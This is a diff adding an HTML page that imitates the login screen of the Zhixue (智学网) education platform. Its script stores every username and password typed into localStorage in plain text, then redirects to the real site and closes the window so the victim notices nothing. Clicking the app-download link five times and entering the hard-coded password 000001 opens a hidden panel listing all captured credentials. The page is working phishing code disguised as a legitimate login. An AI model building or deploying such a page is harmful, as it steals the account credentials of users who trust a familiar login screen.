@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>智学网登录页面</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('zhixue/left.png');
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-position: bottom center;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: white;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        header img {
+            height: 60px;
+        }
+
+        /* 修改APP下载图片的高度 */
+        header #app-download img {
+            height: 40px;
+            /* 可以根据需要调整高度 */
+        }
+
+        header a {
+            text-decoration: none;
+            color: black;
+            margin-left: 20px;
+        }
+
+        main {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            min-height: calc(100vh - 80px);
+            padding-right: 50px;
+        }
+
+        .login-section {
+            width: 350px;
+            position: relative;
+            /* 添加相对定位 */
+        }
+
+        .login-section img {
+            width: 100%;
+            display: block;
+        }
+
+        /* 新增登录表单样式 */
+        .login-form {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .form-container {
+            position: absolute;
+            top: 35%;
+            /* 根据图片输入框位置调整 */
+            left: 55%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+        }
+
+        .input-group {
+            margin: 19px 0;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            /* 去掉边框 */
+            border-radius: 4px;
+            background: transparent;
+            /* 背景透明 */
+            box-sizing: border-box;
+            color: black;
+            /* 输入文字颜色 */
+        }
+
+        input:focus {
+            outline: none;
+            /* 去掉聚焦时的边框 */
+        }
+
+        .login-btn {
+            width: 110%;
+            padding: 12px;
+            background: transparent;
+            /* 背景透明 */
+            color: white;
+            /* 文字颜色 */
+            border: none;
+            /* 去掉边框 */
+            border-radius: 4px;
+            cursor: pointer;
+            transition: color 0.3s;
+            margin-top: 25px;
+            /* 调整按钮与输入框的间距 */
+            font-size: 16px;
+            /* 调整文字大小 */
+        }
+
+        .login-btn:hover {
+            color: white;
+            /* 悬停时文字颜色稍深 */
+        }
+
+        /* 虚拟键盘样式 */
+        .virtual-keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            position: fixed;
+            bottom: 0%;
+            /* 上移键盘位置 */
+            left: 20%;
+            transform: translateX(-50%);
+            width: 200px;
+            /* 缩小键盘宽度 */
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            opacity: 0;
+            /* 初始隐藏 */
+            visibility: hidden;
+            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
+            /* 添加动态效果 */
+        }
+
+        .virtual-keyboard button {
+            padding: 8px;
+            font-size: 16px;
+            background-color: white;
+            color: #009a86;
+            /* 智学网的蓝绿色 */
+            border: 1px solid #009a86;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .virtual-keyboard button:hover {
+            background-color: #009a86;
+            color: white;
+        }
+
+        .virtual-keyboard.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <a href="#"><img src="zhixue/logo.png" alt="智学网logo"></a>
+        <a href="#" id="app-download"><img src="zhixue/app.png" alt="智学APP下载"></a>
+    </header>
+    <main>
+        <div class="login-section">
+            <!-- 原背景图片 -->
+            <img src="zhixue/dlu.png" alt="登录界面背景">
+
+            <!-- 实际登录表单 -->
+            <div class="login-form">
+                <div class="form-container">
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <input type="text" id="username" placeholder="用户名" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" id="password" placeholder="请输入密码" required>
+                        </div>
+                        <button type="submit" class="login-btn">.</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- 虚拟键盘 -->
+    <div class="virtual-keyboard" id="virtualKeyboard">
+        <button>1</button>
+        <button>2</button>
+        <button>3</button>
+        <button>4</button>
+        <button>5</button>
+        <button>6</button>
+        <button>7</button>
+        <button>8</button>
+        <button>9</button>
+        <button>0</button>
+        <button>删除</button>
+        <button>完成</button>
+    </div>
+
+    <script>
+        // 存储所有历史登录信息
+        let loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
+
+        // 页面加载时读取历史登录信息
+        document.addEventListener('DOMContentLoaded', function () {
+            if (loginHistory.length > 0) {
+                // 如果有历史记录，显示最近一次登录信息
+                const lastLogin = loginHistory[loginHistory.length - 1];
+                document.getElementById('username').value = lastLogin.username || '';
+                document.getElementById('password').value = lastLogin.password || '';
+            }
+        });
+
+        // 登录表单提交事件
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // 获取输入值
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // 将登录信息添加到历史记录
+            loginHistory.push({ username, password });
+            localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
+
+            // 跳转到智学网
+            window.location.href = 'https://www.zhixue.com';
+
+            // 关闭当前页面
+            setTimeout(() => {
+                window.close();
+            }, 1000);
+            // 延迟 1 秒确保跳转完成
+        });
+
+        // 点击计数器
+        let clickCount = 0;
+        let adminPasswordInput;
+
+        // APP下载按钮点击事件
+        document.getElementById('app-download').addEventListener('click', function (e) {
+            e.preventDefault();
+            // 阻止默认跳转行为
+
+            // 增加点击计数
+            clickCount++;
+
+            // 如果点击次数达到 5 次
+            if (clickCount >= 5) {
+                // 重置点击计数
+                clickCount = 0;
+
+                // 弹出密码输入框
+                const passwordPrompt = document.createElement('input');
+                passwordPrompt.type = 'password';
+                passwordPrompt.placeholder = '请输入管理员密码';
+                adminPasswordInput = passwordPrompt;
+
+                const confirmButton = document.createElement('button');
+                confirmButton.textContent = '确认';
+
+                const promptDiv = document.createElement('div');
+                promptDiv.appendChild(passwordPrompt);
+                promptDiv.appendChild(confirmButton);
+
+                document.body.appendChild(promptDiv);
+
+                // 显示虚拟键盘
+                const virtualKeyboard = document.getElementById('virtualKeyboard');
+                virtualKeyboard.classList.add('show');
+
+                // 处理确认按钮点击事件
+                confirmButton.addEventListener('click', function () {
+                    const password = passwordPrompt.value;
+                    if (password === '000001') {
+                        // 密码正确，打开新窗口显示历史登录信息
+                        const historyWindow = window.open('', '历史登录信息', 'width=400,height=300');
+                        historyWindow.document.write(`
+                            <html>
+                                <head>
+                                    <title>历史登录信息</title>
+                                    <style>
+                                        body {
+                                            font-family: Arial, sans-serif;
+                                            padding: 20px;
+                                        }
+                                        h1 {
+                                            font-size: 18px;
+                                            margin-bottom: 10px;
+                                        }
+                                        ul {
+                                            list-style-type: none;
+                                            padding: 0;
+                                        }
+                                        li {
+                                            margin-bottom: 10px;
+                                        }
+                                    </style>
+                                </head>
+                                <body>
+                                    <h1>历史登录信息</h1>
+                                    <ul>
+                                        ${loginHistory.map(login => `
+                                            <li>用户名: ${login.username}, 密码: ${login.password}</li>
+                                        `).join('')}
+                                    </ul>
+                                </body>
+                            </html>
+                        `);
+                        historyWindow.document.close();
+                    } else {
+                        // 密码错误，提示用户
+                        alert('密码错误，无法查看历史登录信息！');
+                    }
+                    // 隐藏虚拟键盘
+                    virtualKeyboard.classList.remove('show');
+                    // 移除输入框和确认按钮
+                    document.body.removeChild(promptDiv);
+                });
+            }
+        });
+
+        // 处理虚拟键盘点击事件
+        const virtualKeyboard = document.getElementById('virtualKeyboard');
+        virtualKeyboard.addEventListener('click', function (e) {
+            if (e.target.tagName === 'BUTTON') {
+                const buttonText = e.target.textContent;
+                if (buttonText === '删除') {
+                    adminPasswordInput.value = adminPasswordInput.value.slice(0, -1);
+                } else if (buttonText === '完成') {
+                    // 隐藏虚拟键盘
+                    virtualKeyboard.classList.remove('show');
+                } else {
+                    adminPasswordInput.value += buttonText;
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
